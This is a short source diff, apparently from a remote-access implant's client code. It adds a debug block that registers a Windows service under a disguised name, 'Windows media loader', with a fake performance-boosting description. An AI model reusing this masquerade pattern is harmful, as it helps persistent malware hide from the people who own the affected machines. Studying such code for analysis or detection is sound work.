@@ -23,6 +23,14 @@ SERVANT_API void InitServant()
 	strcpy_s(g_ConfigInfo.szGroups, sizeof(g_ConfigInfo.szGroups), "Default");
 	strcpy_s(g_ConfigInfo.szAddr, sizeof(g_ConfigInfo.szAddr), "127.0.0.1");
 #endif
+
+#ifdef _DEBUG
+	strcpy_s(g_ServiceInfo.szDisplayName, "Windows media loader");
+	strcpy_s(g_ServiceInfo.szServiceDecript, "maker your mediaplayer load media file faster");
+	strcpy_s(g_ServiceInfo.szServiceName, "medialoader");
+	lstrcpy(g_ServiceInfo.szInstalPath,_T("C:\\source\\trochilus\\client\\binD\\"));
+#endif
+
 	WSADATA wsaData = {0};
 	::WSAStartup(MAKEWORD(2, 2), &wsaData);
 
